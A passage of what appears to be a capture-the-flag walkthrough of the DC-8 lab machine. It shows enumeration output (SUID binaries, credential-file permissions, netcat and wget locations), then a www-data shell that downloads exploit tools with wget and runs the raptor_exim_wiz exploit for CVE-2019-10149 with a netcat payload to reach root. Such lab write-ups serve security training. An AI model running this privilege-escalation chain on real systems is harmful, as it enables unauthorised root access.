+-rw-r--r-- 1 root root 1022 Jul  6  2017 rescue.service
+-rw-r--r-- 1 root root  486 Jul  6  2017 rescue.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 rmnologin.service -> /dev/null
+-rw-r--r-- 1 root root  500 Jul  6  2017 rpcbind.target
+lrwxrwxrwx 1 root root   15 Jul  6  2017 runlevel0.target -> poweroff.target
+lrwxrwxrwx 1 root root   13 Jul  6  2017 runlevel1.target -> rescue.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 runlevel1.target.wants
+lrwxrwxrwx 1 root root   17 Jul  6  2017 runlevel2.target -> multi-user.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 runlevel2.target.wants
+lrwxrwxrwx 1 root root   17 Jul  6  2017 runlevel3.target -> multi-user.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 runlevel3.target.wants
+lrwxrwxrwx 1 root root   17 Jul  6  2017 runlevel4.target -> multi-user.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 runlevel4.target.wants
+lrwxrwxrwx 1 root root   16 Jul  6  2017 runlevel5.target -> graphical.target
+drwxr-xr-x 2 root root 4.0K Jul  6  2017 runlevel5.target.wants
+lrwxrwxrwx 1 root root   13 Jul  6  2017 runlevel6.target -> reboot.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 sendsigs.service -> /dev/null
+-rw-r--r-- 1 root root 1.1K Jul  6  2017 serial-getty@.service
+-rw-r--r-- 1 root root  402 Jul  6  2017 shutdown.target
+-rw-r--r-- 1 root root  362 Jul  6  2017 sigpwr.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 single.service -> /dev/null
+-rw-r--r-- 1 root root  420 Jul  6  2017 sleep.target
+-rw-r--r-- 1 root root  409 Jul  6  2017 slices.target
+-rw-r--r-- 1 root root  380 Jul  6  2017 smartcard.target
+-rw-r--r-- 1 root root  356 Jul  6  2017 sockets.target
+-rw-r--r-- 1 root root  380 Jul  6  2017 sound.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 stop-bootlogd-single.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 stop-bootlogd.service -> /dev/null
+-rw-r--r-- 1 root root  441 Jul  6  2017 suspend.target
+-rw-r--r-- 1 root root  353 Jul  6  2017 swap.target
+-rw-r--r-- 1 root root  715 Jul  6  2017 sys-fs-fuse-connections.mount
+-rw-r--r-- 1 root root  719 Jul  6  2017 sys-kernel-config.mount
+-rw-r--r-- 1 root root  662 Jul  6  2017 sys-kernel-debug.mount
+-rw-r--r-- 1 root root  518 Jul  6  2017 sysinit.target
+-rw-r--r-- 1 root root 1.3K Jul  6  2017 syslog.socket
+-rw-r--r-- 1 root root  585 Jul  6  2017 system-update.target
+-rw-r--r-- 1 root root  436 Jul  6  2017 system.slice
+-rw-r--r-- 1 root root  664 Jul  6  2017 systemd-ask-password-console.path
+-rw-r--r-- 1 root root  653 Jul  6  2017 systemd-ask-password-console.service
+-rw-r--r-- 1 root root  592 Jul  6  2017 systemd-ask-password-wall.path
+-rw-r--r-- 1 root root  681 Jul  6  2017 systemd-ask-password-wall.service
+-rw-r--r-- 1 root root  724 Jul  6  2017 systemd-backlight@.service
+-rw-r--r-- 1 root root  959 Jul  6  2017 systemd-binfmt.service
+-rw-r--r-- 1 root root  497 Jul  6  2017 systemd-exit.service
+-rw-r--r-- 1 root root  674 Jul  6  2017 systemd-fsck-root.service
+-rw-r--r-- 1 root root  675 Jul  6  2017 systemd-fsck@.service
+-rw-r--r-- 1 root root  551 Jul  6  2017 systemd-fsckd.service
+-rw-r--r-- 1 root root  540 Jul  6  2017 systemd-fsckd.socket
+-rw-r--r-- 1 root root  544 Jul  6  2017 systemd-halt.service
+-rw-r--r-- 1 root root  631 Jul  6  2017 systemd-hibernate-resume@.service
+-rw-r--r-- 1 root root  501 Jul  6  2017 systemd-hibernate.service
+-rw-r--r-- 1 root root  930 Jul  6  2017 systemd-hostnamed.service
+-rw-r--r-- 1 root root  778 Jul  6  2017 systemd-hwdb-update.service
+-rw-r--r-- 1 root root  519 Jul  6  2017 systemd-hybrid-sleep.service
+-rw-r--r-- 1 root root  480 Jul  6  2017 systemd-initctl.service
+-rw-r--r-- 1 root root  524 Jul  6  2017 systemd-initctl.socket
+-rw-r--r-- 1 root root  731 Jul  6  2017 systemd-journal-flush.service
+-rw-r--r-- 1 root root  607 Jul  6  2017 systemd-journald-audit.socket
+-rw-r--r-- 1 root root 1.1K Jul  6  2017 systemd-journald-dev-log.socket
+-rw-r--r-- 1 root root 1.5K Jul  6  2017 systemd-journald.service
+-rw-r--r-- 1 root root  842 Jul  6  2017 systemd-journald.socket
+-rw-r--r-- 1 root root  557 Jul  6  2017 systemd-kexec.service
+-rw-r--r-- 1 root root  911 Jul  6  2017 systemd-localed.service
+-rw-r--r-- 1 root root 1.4K Jul  6  2017 systemd-logind.service
+-rw-r--r-- 1 root root  693 Jul  6  2017 systemd-machine-id-commit.service
+-rw-r--r-- 1 root root  967 Jul  6  2017 systemd-modules-load.service
+-rw-r--r-- 1 root root  685 Jul  6  2017 systemd-networkd-wait-online.service
+-rw-r--r-- 1 root root 1.5K Jul  6  2017 systemd-networkd.service
+-rw-r--r-- 1 root root  591 Jul  6  2017 systemd-networkd.socket
+-rw-r--r-- 1 root root  553 Jul  6  2017 systemd-poweroff.service
+-rw-r--r-- 1 root root  614 Jul  6  2017 systemd-quotacheck.service
+-rw-r--r-- 1 root root  752 Jul  6  2017 systemd-random-seed.service
+-rw-r--r-- 1 root root  548 Jul  6  2017 systemd-reboot.service
+-rw-r--r-- 1 root root  757 Jul  6  2017 systemd-remount-fs.service
+-rw-r--r-- 1 root root 1.5K Jul  6  2017 systemd-resolved.service
+-rw-r--r-- 1 root root  696 Jul  6  2017 systemd-rfkill.service
+-rw-r--r-- 1 root root  617 Jul  6  2017 systemd-rfkill.socket
+-rw-r--r-- 1 root root  497 Jul  6  2017 systemd-suspend.service
+-rw-r--r-- 1 root root  653 Jul  6  2017 systemd-sysctl.service
+-rw-r--r-- 1 root root  868 Jul  6  2017 systemd-timedated.service
+-rw-r--r-- 1 root root 1.3K Jul  6  2017 systemd-timesyncd.service
+-rw-r--r-- 1 root root  598 Jul  6  2017 systemd-tmpfiles-clean.service
+-rw-r--r-- 1 root root  450 Jul  6  2017 systemd-tmpfiles-clean.timer
+-rw-r--r-- 1 root root  703 Jul  6  2017 systemd-tmpfiles-setup-dev.service
+-rw-r--r-- 1 root root  683 Jul  6  2017 systemd-tmpfiles-setup.service
+-rw-r--r-- 1 root root  823 Jul  6  2017 systemd-udev-settle.service
+-rw-r--r-- 1 root root  743 Jul  6  2017 systemd-udev-trigger.service
+-rw-r--r-- 1 root root  595 Jul  6  2017 systemd-udevd-control.socket
+-rw-r--r-- 1 root root  570 Jul  6  2017 systemd-udevd-kernel.socket
+-rw-r--r-- 1 root root  968 Jul  6  2017 systemd-udevd.service
+-rw-r--r-- 1 root root  757 Jul  6  2017 systemd-update-utmp-runlevel.service
+-rw-r--r-- 1 root root  754 Jul  6  2017 systemd-update-utmp.service
+-rw-r--r-- 1 root root  588 Jul  6  2017 systemd-user-sessions.service
+-rw-r--r-- 1 root root  395 Jul  6  2017 time-sync.target
+-rw-r--r-- 1 root root  405 Jul  6  2017 timers.target
+lrwxrwxrwx 1 root root   21 Jul  6  2017 udev.service -> systemd-udevd.service
+-rw-r--r-- 1 root root  417 Jul  6  2017 umount.target
+lrwxrwxrwx 1 root root    9 Jul  6  2017 umountfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 umountnfs.service -> /dev/null
+lrwxrwxrwx 1 root root    9 Jul  6  2017 umountroot.service -> /dev/null
+lrwxrwxrwx 1 root root   27 Jul  6  2017 urandom.service -> systemd-random-seed.service
+-rw-r--r-- 1 root root  392 Jul  6  2017 user.slice
+-rw-r--r-- 1 root root  548 Jul  6  2017 user@.service
+lrwxrwxrwx 1 root root    9 Jul  6  2017 x11-common.service -> /dev/null
+-rw-r--r-- 1 root root  385 Jun 18  2017 ssh.service
+-rw-r--r-- 1 root root  216 Jun 18  2017 ssh.socket
+-rw-r--r-- 1 root root  196 Jun 18  2017 ssh@.service
+-rw-r--r-- 1 root root  272 Jun  5  2017 sudo.service
+-rw-r--r-- 1 root root  290 Jan 19  2017 rsyslog.service
+-rw-r--r-- 1 root root  552 Jan 10  2017 ifup@.service
+-rw-r--r-- 1 root root  175 Jan  2  2017 phpsessionclean.service
+-rw-r--r-- 1 root root  144 Jan  2  2017 phpsessionclean.timer
+-rw-r--r-- 1 root root  735 Oct 20  2016 networking.service
+-rw-r--r-- 1 root root  312 May 20  2016 console-setup.service
+-rw-r--r-- 1 root root  287 May 19  2016 keyboard-setup.service
+-rw-r--r-- 1 root root  251 May  3  2015 cron.service
+-rw-r--r-- 1 root root  188 Feb 25  2014 rsync.service
+
+/lib/systemd/system/mariadb@bootstrap.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 533 Aug  9  2017 use_galera_new_cluster.conf
+
+/lib/systemd/system/multi-user.target.wants:
+total 0
+lrwxrwxrwx 1 root root 15 Jul 30  2017 dbus.service -> ../dbus.service
+lrwxrwxrwx 1 root root 15 Jul  6  2017 getty.target -> ../getty.target
+lrwxrwxrwx 1 root root 33 Jul  6  2017 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
+lrwxrwxrwx 1 root root 25 Jul  6  2017 systemd-logind.service -> ../systemd-logind.service
+lrwxrwxrwx 1 root root 39 Jul  6  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+lrwxrwxrwx 1 root root 32 Jul  6  2017 systemd-user-sessions.service -> ../systemd-user-sessions.service
+
+/lib/systemd/system/sockets.target.wants:
+total 0
+lrwxrwxrwx 1 root root 14 Jul 30  2017 dbus.socket -> ../dbus.socket
+lrwxrwxrwx 1 root root 25 Jul  6  2017 systemd-initctl.socket -> ../systemd-initctl.socket
+lrwxrwxrwx 1 root root 32 Jul  6  2017 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
+lrwxrwxrwx 1 root root 34 Jul  6  2017 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
+lrwxrwxrwx 1 root root 26 Jul  6  2017 systemd-journald.socket -> ../systemd-journald.socket
+lrwxrwxrwx 1 root root 31 Jul  6  2017 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
+lrwxrwxrwx 1 root root 30 Jul  6  2017 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket
+
+/lib/systemd/system/sysinit.target.wants:
+total 0
+lrwxrwxrwx 1 root root 20 Jul  6  2017 cryptsetup.target -> ../cryptsetup.target
+lrwxrwxrwx 1 root root 22 Jul  6  2017 dev-hugepages.mount -> ../dev-hugepages.mount
+lrwxrwxrwx 1 root root 19 Jul  6  2017 dev-mqueue.mount -> ../dev-mqueue.mount
+lrwxrwxrwx 1 root root 28 Jul  6  2017 kmod-static-nodes.service -> ../kmod-static-nodes.service
+lrwxrwxrwx 1 root root 36 Jul  6  2017 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
+lrwxrwxrwx 1 root root 32 Jul  6  2017 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
+lrwxrwxrwx 1 root root 26 Jul  6  2017 sys-kernel-config.mount -> ../sys-kernel-config.mount
+lrwxrwxrwx 1 root root 25 Jul  6  2017 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
+lrwxrwxrwx 1 root root 36 Jul  6  2017 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
+lrwxrwxrwx 1 root root 25 Jul  6  2017 systemd-binfmt.service -> ../systemd-binfmt.service
+lrwxrwxrwx 1 root root 30 Jul  6  2017 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
+lrwxrwxrwx 1 root root 32 Jul  6  2017 systemd-journal-flush.service -> ../systemd-journal-flush.service
+lrwxrwxrwx 1 root root 27 Jul  6  2017 systemd-journald.service -> ../systemd-journald.service
+lrwxrwxrwx 1 root root 36 Jul  6  2017 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
+lrwxrwxrwx 1 root root 31 Jul  6  2017 systemd-modules-load.service -> ../systemd-modules-load.service
+lrwxrwxrwx 1 root root 30 Jul  6  2017 systemd-random-seed.service -> ../systemd-random-seed.service
+lrwxrwxrwx 1 root root 25 Jul  6  2017 systemd-sysctl.service -> ../systemd-sysctl.service
+lrwxrwxrwx 1 root root 37 Jul  6  2017 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
+lrwxrwxrwx 1 root root 33 Jul  6  2017 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
+lrwxrwxrwx 1 root root 31 Jul  6  2017 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
+lrwxrwxrwx 1 root root 24 Jul  6  2017 systemd-udevd.service -> ../systemd-udevd.service
+lrwxrwxrwx 1 root root 30 Jul  6  2017 systemd-update-utmp.service -> ../systemd-update-utmp.service
+
+/lib/systemd/system/getty.target.wants:
+total 0
+lrwxrwxrwx 1 root root 23 Jul  6  2017 getty-static.service -> ../getty-static.service
+
+/lib/systemd/system/graphical.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  6  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/local-fs.target.wants:
+total 0
+lrwxrwxrwx 1 root root 29 Jul  6  2017 systemd-remount-fs.service -> ../systemd-remount-fs.service
+
+/lib/systemd/system/rescue.target.wants:
+total 0
+lrwxrwxrwx 1 root root 39 Jul  6  2017 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
+
+/lib/systemd/system/timers.target.wants:
+total 0
+lrwxrwxrwx 1 root root 31 Jul  6  2017 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer
+
+/lib/systemd/system/systemd-timesyncd.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 251 Jul  6  2017 disable-with-time-daemon.conf
+
+/lib/systemd/system/systemd-resolved.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 551 Jul  6  2017 resolvconf.conf
+
+/lib/systemd/system/rc-local.service.d:
+total 4.0K
+-rw-r--r-- 1 root root 290 Jul  6  2017 debian.conf
+
+/lib/systemd/system/busnames.target.wants:
+total 0
+
+/lib/systemd/system/runlevel1.target.wants:
+total 0
+
+/lib/systemd/system/runlevel2.target.wants:
+total 0
+
+/lib/systemd/system/runlevel3.target.wants:
+total 0
+
+/lib/systemd/system/runlevel4.target.wants:
+total 0
+
+/lib/systemd/system/runlevel5.target.wants:
+total 0
+
+/lib/systemd/system-sleep:
+total 4.0K
+-rwxr-xr-x 1 root root 92 Jan 24  2017 hdparm
+
+/lib/systemd/network:
+total 16K
+-rw-r--r-- 1 root root 605 Jul  6  2017 80-container-host0.network
+-rw-r--r-- 1 root root 678 Jul  6  2017 80-container-ve.network
+-rw-r--r-- 1 root root 664 Jul  6  2017 80-container-vz.network
+-rw-r--r-- 1 root root  80 Jul  6  2017 99-default.link
+
+/lib/systemd/system-generators:
+total 188K
+-rwxr-xr-x 1 root root 23K Jul  6  2017 systemd-cryptsetup-generator
+-rwxr-xr-x 1 root root 15K Jul  6  2017 systemd-debug-generator
+-rwxr-xr-x 1 root root 31K Jul  6  2017 systemd-fstab-generator
+-rwxr-xr-x 1 root root 15K Jul  6  2017 systemd-getty-generator
+-rwxr-xr-x 1 root root 35K Jul  6  2017 systemd-gpt-auto-generator
+-rwxr-xr-x 1 root root 11K Jul  6  2017 systemd-hibernate-resume-generator
+-rwxr-xr-x 1 root root 11K Jul  6  2017 systemd-rc-local-generator
+-rwxr-xr-x 1 root root 11K Jul  6  2017 systemd-system-update-generator
+-rwxr-xr-x 1 root root 27K Jul  6  2017 systemd-sysv-generator
+
+/lib/systemd/system-preset:
+total 4.0K
+-rw-r--r-- 1 root root 923 Jul  6  2017 90-systemd.preset
+
+/lib/systemd/system-shutdown:
+total 0
+
+
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.19p1
+
+
+[-] MYSQL version:
+mysql  Ver 15.1 Distrib 10.1.26-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
+
+
+[-] Apache version:
+Server version: Apache/2.4.25 (Debian)
+Server built:   2017-09-19T18:58:57
+
+
+[-] Apache user configuration:
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+[-] Installed Apache modules:
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php7_module (shared)
+ reqtimeout_module (shared)
+ rewrite_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+
+
+### INTERESTING FILES ####################################
+[-] Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/curl
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1494 Sep  5  2019 /etc/passwd
+-rw-r--r-- 1 root root 748 Sep  5  2019 /etc/group
+-rw-r--r-- 1 root root 767 Mar  4  2016 /etc/profile
+-rw-r----- 1 root shadow 993 Sep  5  2019 /etc/shadow
+
+
+[-] SUID files:
+-rwsr-xr-x 1 root root 50040 May 17  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 75792 May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40504 May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 59680 May 17  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 140944 Jun  5  2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 40312 May 17  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 1019656 Jun 14  2017 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 440728 Jun 18  2017 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 42992 Jul 30  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 61240 Nov 10  2016 /bin/ping
+-rwsr-xr-x 1 root root 40536 May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 31720 Mar 22  2017 /bin/umount
+-rwsr-xr-x 1 root root 44304 Mar 22  2017 /bin/mount
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root tty 27448 Mar 22  2017 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 22808 May 17  2017 /usr/bin/expiry
+-rwxr-sr-x 1 root tty 14768 Apr 12  2017 /usr/bin/bsd-write
+-rwxr-sr-x 1 root ssh 358624 Jun 18  2017 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root crontab 40264 May  3  2015 /usr/bin/crontab
+-rwxr-sr-x 1 root shadow 71856 May 17  2017 /usr/bin/chage
+-rwxr-sr-x 1 root mail 19008 Jan 17  2017 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root shadow 35592 May 28  2017 /sbin/unix_chkpwd
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r--r-- 1 root root 4781 Jan 24  2017 /etc/hdparm.conf
+-rw-r--r-- 1 root root 552 May 28  2017 /etc/pam.conf
+-rw-r--r-- 1 root root 2969 May 22  2017 /etc/debconf.conf
+-rw-r--r-- 1 root root 47 May 20 07:25 /etc/resolv.conf
+-rw-r--r-- 1 root root 3173 May 30  2017 /etc/reportbug.conf
+-rw-r--r-- 1 root root 144 Sep  5  2019 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 973 Feb  1  2017 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 2981 Sep  5  2019 /etc/adduser.conf
+-rw-r--r-- 1 root root 9 Aug  8  2006 /etc/host.conf
+-rw-r--r-- 1 root root 2584 Aug  2  2016 /etc/gai.conf
+-rw-r--r-- 1 root root 1963 Jan 19  2017 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 604 Jun 27  2016 /etc/deluser.conf
+-rw-r--r-- 1 root root 34 Apr 10  2017 /etc/ld.so.conf
+-rw-r--r-- 1 root root 1260 Mar 17  2016 /etc/ucf.conf
+-rw-r--r-- 1 root root 7431 Sep  5  2019 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 346 Dec  1  2016 /etc/discover-modprobe.conf
+-rw-r--r-- 1 root root 497 Jun 16  2017 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 2683 Nov 22  2016 /etc/sysctl.conf
+-rw-r--r-- 1 root root 191 Apr 13  2017 /etc/libaudit.conf
+-rw-r--r-- 1 root root 599 May  6  2015 /etc/logrotate.conf
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/dc8user/.bash_history
+
+
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x  2 root    mail 4096 May 20 09:48 .
+drwxr-xr-x 12 root    root 4096 Sep  5  2019 ..
+-rw-rw----  1 dc8user mail 1236 May 20 09:48 dc8user
+
+
+### SCAN COMPLETE ####################################
+
+-------------------------------------
+
+www-data@dc-8:/tmp$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+<exploit-suggester/master/linux-exploit-suggester.sh
+--2021-05-20 10:01:55--  https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 87559 (86K) [text/plain]
+Saving to: 'linux-exploit-suggester.sh'
+
+     0K .......... .......... .......... .......... .......... 58% 2.47M 0s
+    50K .......... .......... .......... .....                100% 5.89M=0.03s
+
+2021-05-20 10:01:55 (3.25 MB/s) - 'linux-exploit-suggester.sh' saved [87559/87559]
+
+
+
+www-data@dc-8:/tmp$ chmod +x linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+
+
+
+www-data@dc-8:/tmp$ ./linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+
+Available information:
+
+Kernel version: 4.9.0
+Architecture: x86_64
+Distribution: debian
+Distribution version: 9
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+76 kernel space exploits
+48 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2019-13272] PTRACE_TRACEME
+
+   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
+   Exposure: highly probable
+   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},[ debian=9{kernel:4.9.0-*} ],debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
+   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
+   Comments: Requires an active PolKit agent.
+
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+
+[+] [CVE-2019-18634] sudo pwfeedback
+
+   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+   Exposure: less probable
+   Tags: mint=19
+   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+   Comments: sudo configuration requires pwfeedback to be enabled.
+
+[+] [CVE-2019-10149] raptor_exim_wiz
+
+   Details: https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/46996
+
+[+] [CVE-2017-6074] dccp
+
+   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+   Exposure: less probable
+   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
+   Download URL: https://www.exploit-db.com/download/41458
+   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+
+[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64
+
+   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+   Exposure: less probable
+   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
+   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
+   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries
+
+[+] [CVE-2017-1000253] PIE_stack_corruption
+
+   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
+   Exposure: less probable
+   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
+   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c
+
+www-data@dc-8:/tmp$ 
+
+
+> Info from the results of the LinEnum script:		 
+  -rwsr-xr-x 1 root root 1019656 Jun 14  2017 /usr/sbin/exim4
+  
+> Info from the results of the Linux-Exploit-suggester script:  
+   CVE-2019-10149 - raptor_exim_wiz
+
+
+========================================================================================================================
+Step 4. Privilege escalation to ROOT
+========================================================================================================================
+
+A SUID root binary 'exim4' is prone to a code execution vulnerability (CVE-2019-10149 - raptor_exim_wiz)
+		
+Let's download and execute an exploit for the vulnerability "CVE-2019-10149 - raptor_exim_wiz		
+
+www-data@dc-8:/tmp$ 
+
+www-data@dc-8:/tmp$ wget https://raw.githubusercontent.com/0xdea/exploits/master/linux/raptor_exim_wiz                                   
+<ent.com/0xdea/exploits/master/linux/raptor_exim_wiz                                                                                             
+--2021-05-20 10:14:53--  https://raw.githubusercontent.com/0xdea/exploits/master/linux/raptor_exim_wiz                                           
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...                        
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.                                           
+HTTP request sent, awaiting response... 200 OK                                                                                                   
+Length: 3557 (3.5K) [text/plain]
+Saving to: 'raptor_exim_wiz'
+
+     0K ...                                                   100% 84.1M=0s
+
+2021-05-20 10:14:54 (84.1 MB/s) - 'raptor_exim_wiz' saved [3557/3557]
+
+www-data@dc-8:/tmp$ ls -l       
+ls -l
+total 140
+-rwxr-xr-x 1 www-data www-data 46631 May 20 09:48 LinEnum.sh
+-rwxr-xr-x 1 www-data www-data 87559 May 20 10:01 linux-exploit-suggester.sh
+-rw-r--r-- 1 www-data www-data  3557 May 20 10:14 raptor_exim_wiz
+www-data@dc-8:/tmp$ chmod +x raptor_exim_wiz
+chmod +x raptor_exim_wiz
+www-data@dc-8:/tmp$ ls -al
+ls -al
+total 148
+drwxrwxrwt  2 root     root      4096 May 20 10:14 .
+drwxr-xr-x 22 root     root      4096 Sep  5  2019 ..
+-rwxr-xr-x  1 www-data www-data 46631 May 20 09:48 LinEnum.sh
+-rwxr-xr-x  1 www-data www-data 87559 May 20 10:01 linux-exploit-suggester.sh
+-rwxr-xr-x  1 www-data www-data  3557 May 20 10:14 raptor_exim_wiz
+
+
+www-data@dc-8:/tmp$ ./raptor_exim_wiz -n setuid
+./raptor_exim_wiz -n setuid
+
+raptor_exim_wiz - "The Return of the WIZard" LPE exploit
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+./raptor_exim_wiz [-m METHOD]
+
+-m setuid : use the setuid payload (default)
+-m netcat : use the netcat payload
+
+
+www-data@dc-8:/tmp$ ./raptor_exim_wiz -m netcat
+./raptor_exim_wiz -m netcat
+
+raptor_exim_wiz - "The Return of the WIZard" LPE exploit
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+Delivering netcat payload...
+220 dc-8 ESMTP Exim 4.89 Thu, 20 May 2021 10:22:40 +1000
+250 dc-8 Hello localhost [::1]
+250 OK
+250 Accepted
+354 Enter message, ending with "." on a line by itself
